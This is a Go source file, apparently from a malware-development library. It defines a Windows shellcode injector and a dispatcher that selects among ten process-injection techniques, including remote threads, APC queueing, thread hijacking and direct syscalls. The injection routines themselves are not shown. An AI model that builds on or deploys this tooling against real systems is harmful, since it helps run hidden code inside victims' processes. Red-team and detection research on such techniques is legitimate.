//go:build windows

package inject

import (
	"fmt"

	"github.com/oioio-space/maldev/win/api"
)

// Windows injection constants
const (
	threadWaitTimeout = 2000
	contextFull       = 0x10001F // CONTEXT_FULL (x64)
)

// context64 is a local alias for api.Context64 (x64 thread context).
type context64 = api.Context64

// windowsInjector implements injection for Windows. The embedded
// regionRecorder provides InjectedRegion() to satisfy SelfInjector;
// self-process methods call record(addr, size) on success.
type windowsInjector struct {
	config *Config
	regionRecorder
}

func newPlatformInjector(cfg *Config) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	return &windowsInjector{config: cfg}, nil
}

func (w *windowsInjector) Inject(shellcode []byte) error {
	switch w.config.Method {
	case MethodCreateRemoteThread:
		return w.injectCreateRemoteThread(shellcode)
	case MethodCreateThread:
		return w.injectCreateThread(shellcode)
	case MethodQueueUserAPC:
		return w.injectQueueUserAPC(shellcode)
	case MethodEarlyBirdAPC:
		return w.injectEarlyBird(shellcode)
	case MethodThreadHijack:
		return w.injectThreadHijack(shellcode)
	case MethodRtlCreateUserThread:
		return w.injectRtlCreateUserThread(shellcode)
	case MethodDirectSyscall:
		return w.injectDirectSyscall(shellcode)
	case MethodCreateFiber:
		return w.injectCreateFiber(shellcode)
	case MethodEtwpCreateEtwThread:
		return w.injectEtwpCreateEtwThread(shellcode)
	case MethodNtQueueApcThreadEx:
		return w.injectNtQueueApcThreadEx(shellcode)
	default:
		return fmt.Errorf("unknown injection method: %s", w.config.Method)
	}
}
